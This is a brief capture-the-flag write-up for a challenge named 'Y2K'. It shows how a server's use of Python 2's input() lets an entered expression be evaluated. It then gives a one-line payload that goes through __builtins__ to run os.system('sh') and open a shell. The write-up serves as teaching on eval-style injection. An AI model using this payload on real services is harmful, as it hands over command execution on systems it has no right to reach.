# Y2K
They told us the world was going to end in the year 2000! But it didn't... when will the world end? 

## Writeup
1. netcat to the server
```
What year do YOU think the world will end?
a
Traceback (most recent call last):
  File "/home/challenge/server.py", line 4, in <module>
    end = input()
  File "<string>", line 1, in <module>
NameError: name 'a' is not defined
```

2. It runs python and saves my input, I tried
```
What year do YOU think the world will end?
globals()
Yeah! I agree with you! I also think the world will end in the year
{'end': {...}, '__builtins__': <module '__builtin__' (built-in)>, '__file__': '/home/challenge/server.py', '__package__': None, '__name__': '__main__', '__doc__': None}
```

3. It prints out my input, but that doesn't matter actually. I just called sh and get the shell.
```
globals()['__builtins__'].__dict__['__import__']('os').__dict__['system']('sh')
```